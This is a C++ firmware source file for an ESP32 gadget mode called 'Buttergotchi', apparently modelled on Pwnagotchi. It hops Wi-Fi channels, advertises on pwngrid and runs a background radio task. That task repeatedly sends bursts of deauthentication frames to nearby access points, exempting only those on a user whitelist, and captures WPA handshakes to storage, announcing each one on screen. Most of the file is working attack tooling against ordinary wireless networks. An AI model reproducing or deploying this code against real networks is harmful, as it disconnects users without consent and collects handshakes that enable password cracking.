/*
Thanks to thoses developers for their projects:
* @7h30th3r0n3 : https://github.com/7h30th3r0n3/Evil-M5Core2 and https://github.com/7h30th3r0n3/PwnGridSpam
* @viniciusbo : https://github.com/viniciusbo/m5-palnagotchi
* @sduenasg : https://github.com/sduenasg/pio_palnagotchi

Thanks to @bmorcelli for his help doing a better code.
*/
#include "../wifi/sniffer.h"
#include "../wifi/wifi_atks.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "esp_err.h"
#include "ui.h"
#include "core/settings.h"
#include "core/sd_functions.h"
#include "core/display.h"
#include <Arduino.h>

#define STATE_INIT 0
#define STATE_WAKE 1
#define STATE_HALT 255

void advertise(uint8_t channel);
void wakeUp();
void toggle_all_channels();

uint8_t state;
uint8_t current_channel = 255;
volatile bool buttergotchi_exit = false;
bool use_all_channels = false;

const uint8_t pri_wifi_channels_default[] = {1, 6, 11};
const uint8_t *active_channels = pri_wifi_channels_default;
uint8_t active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);

// ── Dual-core shared state ──
static TaskHandle_t g_radio_task = NULL;
static SemaphoreHandle_t g_whitelist_mutex = NULL;
static volatile int g_hs_count = 0;    // Core 0 writes, Core 1 reads for toast

void toggle_all_channels() {
    use_all_channels = !use_all_channels;
    if (use_all_channels) {
        active_channels = all_wifi_channels;
        active_channels_size = sizeof(all_wifi_channels) / sizeof(all_wifi_channels[0]);
    } else {
        active_channels = pri_wifi_channels_default;
        active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);
    }
    current_channel = 255;
}

void buttergotchi_setup() {
    initPwngrid();
    initUi();
    state = STATE_INIT;
    Serial.println("Buttergotchi Initialized");
}

void buttergotchi_update() {
    if (state == STATE_HALT) return;
    if (state == STATE_INIT) { state = STATE_WAKE; wakeUp(); }
    if (state == STATE_WAKE) {
        checkPwngridGoneFriends();
        current_channel++;
        if (current_channel >= active_channels_size) current_channel = 0;
        ch = active_channels[current_channel];
        advertise(active_channels[current_channel]);
    }
    updateUi(true);
}

void wakeUp() {
    for (uint8_t i = 0; i < 4; i++) {
        setMood(i % getNumberOfMoods());
        updateUi(false);
        vTaskDelay(300 / portTICK_RATE_MS);
    }
}

static uint8_t g_advertise_fail_count = 0;

void advertise(uint8_t channel) {
    esp_err_t result = pwngridAdvertise(channel, getCurrentMoodFace());
    if (result == ESP_ERR_NO_MEM) {
        Serial.println("pwngridAdvertise: OOM, will retry");
        return;
    }
    if (result != ESP_OK) {
        g_advertise_fail_count++;
        Serial.printf("pwngridAdvertise: error %d (fail %d)\n", result, g_advertise_fail_count);
        if (g_advertise_fail_count >= 10) {
            setMood(MOOD_BROKEN, "", "Can't advertise (err " + String(result) + ")", true);
        }
        return;
    }
    g_advertise_fail_count = 0;
}

void set_buttergotchi_exit(bool new_value) { buttergotchi_exit = new_value; }

// ── Whitelist UI ──
static bool isMacEntry(const String &entry) {
    return entry.indexOf(':') >= 0;
}

static void whitelist_add(const String &entry) {
    if (g_whitelist_mutex) xSemaphoreTake(g_whitelist_mutex, portMAX_DELAY);
    buttergotchiConfig.addDeauthWhitelist(entry);
    if (g_whitelist_mutex) xSemaphoreGive(g_whitelist_mutex);
}

static void whitelist_remove(const String &entry) {
    if (g_whitelist_mutex) xSemaphoreTake(g_whitelist_mutex, portMAX_DELAY);
    buttergotchiConfig.removeDeauthWhitelist(entry);
    if (g_whitelist_mutex) xSemaphoreGive(g_whitelist_mutex);
}

static std::vector<String> whitelist_snapshot() {
    if (!g_whitelist_mutex) return buttergotchiConfig.getDeauthWhitelist();
    std::vector<String> copy;
    if (xSemaphoreTake(g_whitelist_mutex, pdMS_TO_TICKS(50)) == pdTRUE) {
        copy = buttergotchiConfig.getDeauthWhitelist();
        xSemaphoreGive(g_whitelist_mutex);
    }
    return copy;
}

void buttergotchi_whitelist_menu() {
    std::vector<Option> opts = {
        {"Add MAC", [=]() {
            String mac = keyboard("", 17, "MAC (aa:bb:cc:dd:ee:ff):");
            if (mac.length() > 0) { whitelist_add(mac); displayInfo("Added MAC: " + mac, true); }
            buttergotchi_whitelist_menu();
        }},
        {"Add SSID", [=]() {
            String ssid = keyboard("", 32, "SSID name:");
            if (ssid.length() > 0) { whitelist_add(ssid); displayInfo("Added SSID: " + ssid, true); }
            buttergotchi_whitelist_menu();
        }},
        {"Remove Entry", [=]() {
            auto wl = whitelist_snapshot();
            if (wl.empty()) { displayInfo("Whitelist empty", true); buttergotchi_whitelist_menu(); return; }
            std::vector<Option> removeOpts;
            for (const auto &entry : wl) {
                String e = entry;
                String label = isMacEntry(entry) ? "[MAC] " + e : "[SSID] " + e;
                removeOpts.push_back({label.c_str(), [=]() {
                    whitelist_remove(e);
                    displayInfo("Removed: " + e, true);
                    buttergotchi_whitelist_menu();
                }});
            }
            removeOpts.push_back({"Back", []() { buttergotchi_whitelist_menu(); }});
            loopOptions(removeOpts, MENU_TYPE_SUBMENU, "Remove Entry");
        }},
        {"List All", [=]() {
            auto wl = whitelist_snapshot();
            if (wl.empty()) { displayInfo("Whitelist empty", true); }
            else {
                String text = "Whitelist (" + String(wl.size()) + "):\n";
                for (const auto &entry : wl) {
                    if (isMacEntry(entry)) text += "[MAC] ";
                    else text += "[SSID] ";
                    text += entry.c_str(); text += "\n";
                }
                displayTextLine(text.c_str());
            }
            buttergotchi_whitelist_menu();
        }},
        {"Clear All", [=]() {
            auto wl = whitelist_snapshot();
            for (const auto &entry : wl) whitelist_remove(entry);
            displayInfo("Whitelist cleared", true);
            buttergotchi_whitelist_menu();
        }},
        {"Back", []() { return; }},
    };
    loopOptions(opts, MENU_TYPE_SUBMENU, "Deauth Whitelist");
}

// ── Handshake Toast ──
static unsigned long lastToastTime = 0;
static String lastToastSsid = "";

void show_handshake_toast(const String &ssid) {
    unsigned long now = millis();
    if (now - lastToastTime < 4000) return;
    if (ssid == lastToastSsid) return;
    lastToastTime = now;
    lastToastSsid = ssid;
    tft.fillRect(0, tftHeight - 30, tftWidth, 30, buttergotchiConfig.bgColor);
    tft.setTextColor(TFT_RED, buttergotchiConfig.bgColor);
    tft.setTextSize(1);
    tft.setTextDatum(MC_DATUM);
    tft.drawString((ssid + " is TOAST!").c_str(), tftWidth / 2, tftHeight - 15);
}

// ── Core 0: Radio Worker Task ──
static void radio_task(void *param) {
    uint32_t lastAdv = 0;
    uint32_t lastDeauth = 0;
    uint32_t lastMoodCheck = 0;
    bool deauthFaces = false;

    while (!buttergotchi_exit) {
        uint32_t now = millis();

        // Beacon list housekeeping (limit size)
        if (registeredBeaconsMutex && xSemaphoreTake(registeredBeaconsMutex, pdMS_TO_TICKS(5)) == pdTRUE) {
            if (registeredBeacons.size() > 30) registeredBeacons.clear();
            xSemaphoreGive(registeredBeaconsMutex);
        }

        // Channel hop + advertise every 2500ms
        if (now - lastAdv > 1500) {
            current_channel++;
            if (current_channel >= active_channels_size) current_channel = 0;
            ch = active_channels[current_channel];
            advertise(ch);
            lastAdv = now;
        }

        // Deauth every 400ms with burst
        if (now - lastDeauth > 300) {
            bool hasTargets = false;
            if (registeredBeaconsMutex && xSemaphoreTake(registeredBeaconsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
                if (!registeredBeacons.empty()) {
                for (const auto &beacon : registeredBeacons) {
                    if (beacon.channel == ch) {
                        char macStr[18];
                        snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
                                 beacon.MAC[0], beacon.MAC[1], beacon.MAC[2],
                                 beacon.MAC[3], beacon.MAC[4], beacon.MAC[5]);

                        // Check whitelist under mutex (Core 1 may modify via menu)
                        bool whitelisted = false;
                        if (g_whitelist_mutex && xSemaphoreTake(g_whitelist_mutex, pdMS_TO_TICKS(10)) == pdTRUE) {
                            if (buttergotchiConfig.isDeauthWhitelisted(String(macStr))) whitelisted = true;
                            if (!whitelisted) {
                                String ssid = getBeaconSSID(reinterpret_cast<const uint8_t*>(beacon.MAC));
                                if (ssid.length() > 0 && buttergotchiConfig.isDeauthWhitelisted(ssid)) whitelisted = true;
                            }
                            xSemaphoreGive(g_whitelist_mutex);
                        }
                        if (whitelisted) continue;

                        memcpy(&ap_record.bssid, beacon.MAC, 6);
                        hasTargets = true;
                        xSemaphoreGive(registeredBeaconsMutex);
                        wsl_bypasser_send_raw_frame(&ap_record, beacon.channel);
                        for (int b = 0; b < 5; b++) {
                            send_raw_frame(deauth_frame, 26);
                        }
                        if (registeredBeaconsMutex) xSemaphoreTake(registeredBeaconsMutex, portMAX_DELAY);
                    }
                }
                }
                xSemaphoreGive(registeredBeaconsMutex);
            }
            if (hasTargets) { lastDeauth = now; deauthFaces = true; }
        }

        // Mood check every 4000ms
        if (now - lastMoodCheck > 4000) {
            bool hasBeacons = false;
            size_t beaconCount = 0;
            if (registeredBeaconsMutex && xSemaphoreTake(registeredBeaconsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
                hasBeacons = !registeredBeacons.empty();
                beaconCount = registeredBeacons.size();
                xSemaphoreGive(registeredBeaconsMutex);
            }
            if (hasBeacons) {
                static const Mood activeMoods[] = {MOOD_INTENSE, MOOD_COOL, MOOD_SMART, MOOD_MOTIVATED, MOOD_DEBUGGING};
                static uint8_t activeIdx = 0;
                setMood(activeMoods[activeIdx % 5], "", "Pwning " + String(beaconCount) + " friends!", false);
                activeIdx++;
            } else if (deauthFaces) {
                static const Mood happyMoods[] = {MOOD_HAPPY, MOOD_GRATEFUL, MOOD_EXCITED, MOOD_FRIENDLY};
                static uint8_t happyIdx = 0;
                setMood(happyMoods[happyIdx % 4], "", "", false);
                happyIdx++;
                deauthFaces = false;
            } else {
                static const Mood lonelyMoods[] = {MOOD_OBSERVING_HAPPY_R, MOOD_DEMOTIVATED, MOOD_BORED, MOOD_SAD, MOOD_LONELY};
                static uint8_t lonelyIdx = 0;
                setMood(lonelyMoods[lonelyIdx % 5], "", "", false);
                lonelyIdx++;
            }
            lastMoodCheck = now;
        }

        // Share handshake count with UI core
        g_hs_count = num_HS;

        vTaskDelay(10 / portTICK_RATE_MS);
    }
    vTaskDelete(NULL);
}

// ── Core 1: UI Loop ──
static void ui_loop() {
    uint32_t lastUi = 0;
    int lastHS = 0;

    while (!buttergotchi_exit) {
        uint32_t now = millis();

        // Handshake toast (reads atomic hs count from radio task)
        if (g_hs_count > lastHS) {
            show_handshake_toast(String("Handshake #") + String(g_hs_count));
            lastHS = g_hs_count;
        }

        // UI refresh every 1000ms
        if (now - lastUi > 1000) {
            updateUi(true);
            lastUi = now;
        }

        // [Sel] button → show menu (radio keeps running on Core 0!)
        if (check(SelPress)) {
            String channel_status = use_all_channels ? "All Ch: ON" : "All Ch: OFF";
            options = {
                {"Find friends", yield},
                {channel_status.c_str(), toggle_all_channels},
                {"Whitelist", []() { buttergotchi_whitelist_menu(); }},
                {"Main Menu", lambdaHelper(set_buttergotchi_exit, true)},
            };
            loopOptions(options);
            tft.fillScreen(buttergotchiConfig.bgColor);
            drawTopCanvas();
            drawBottomCanvas();
            updateUi(true);
        }

        if (buttergotchi_exit) break;
        vTaskDelay(50 / portTICK_RATE_MS);
    }
}

// ── Session stats log ──
static void log_session_to_sd(uint32_t start_ms, int hs_count) {
    // Only log if SD is available (LittleFS is too small for logs)
    if (!setupSdCard()) return;
    if (!SD.exists("/ButtergotchiPCAP")) SD.mkdir("/ButtergotchiPCAP");

    File logFile = SD.open("/ButtergotchiPCAP/sessions.csv", FILE_APPEND);
    if (!logFile) return;

    uint32_t now_ms = millis();
    uint32_t elapsed = now_ms - start_ms;

    // Read current friend count
    size_t friendCount = 0;
    if (registeredBeaconsMutex && xSemaphoreTake(registeredBeaconsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
        friendCount = registeredBeacons.size();
        xSemaphoreGive(registeredBeaconsMutex);
    }

    // CSV: start_ms, end_ms, duration_s, handshakes, friends
    logFile.printf("%u,%u,%u,%d,%u\n", start_ms, now_ms, elapsed / 1000, hs_count, friendCount);
    logFile.close();
}

// ── Entry Point ──
void buttergotchi_start() {
    uint32_t session_start_ms = millis();
    set_buttergotchi_exit(false);

    tft.fillScreen(buttergotchiConfig.bgColor);
    num_HS = 0;
    sniffer_reset_handshake_cache();
    if (registeredBeaconsMutex) xSemaphoreTake(registeredBeaconsMutex, portMAX_DELAY);
    registeredBeacons.clear();
    if (registeredBeaconsMutex) xSemaphoreGive(registeredBeaconsMutex);
    vTaskDelay(300 / portTICK_RATE_MS);

    // Prepare storage
    FS *handshakeFs = nullptr;
    bool sdAvail = setupSdCard();
    if (sdAvail) {
        isLittleFS = false;
        if (!SD.exists("/ButtergotchiPCAP")) SD.mkdir("/ButtergotchiPCAP");
        if (!SD.exists("/ButtergotchiPCAP/handshakes")) SD.mkdir("/ButtergotchiPCAP/handshakes");
        handshakeFs = &SD;
    } else {
        if (!LittleFS.exists("/ButtergotchiPCAP")) LittleFS.mkdir("/ButtergotchiPCAP");
        if (!LittleFS.exists("/ButtergotchiPCAP/handshakes")) LittleFS.mkdir("/ButtergotchiPCAP/handshakes");
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }
    if (handshakeFs) {
        sniffer_prepare_storage(handshakeFs, !isLittleFS);
        sniffer_set_mode(SnifferMode::HandshakesOnly);
        sniffer_reset_handshake_cache();
    }

    wifiPromiscuousActive = true;
    buttergotchi_setup();
    drawTopCanvas();
    drawBottomCanvas();
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    sniffer_set_mode(SnifferMode::HandshakesOnly);

#if defined(HAS_TOUCH)
    TouchFooter();
#endif
    buttergotchi_update();

    // Create whitelist mutex before starting radio task
    if (!g_whitelist_mutex) g_whitelist_mutex = xSemaphoreCreateMutex();

    // Launch radio task on Core 0 (PRO_CPU)
    xTaskCreatePinnedToCore(
        radio_task, "radio_task", 4096, NULL, 5, &g_radio_task, 0
    );

    // UI loop runs on Core 1 (this thread)
    ui_loop();

    log_session_to_sd(session_start_ms, num_HS);
    closeSdCard();

    // Cleanup: radio task auto-deletes on exit
    g_radio_task = NULL;
    wifiPromiscuousActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    wifiDisconnect();
}
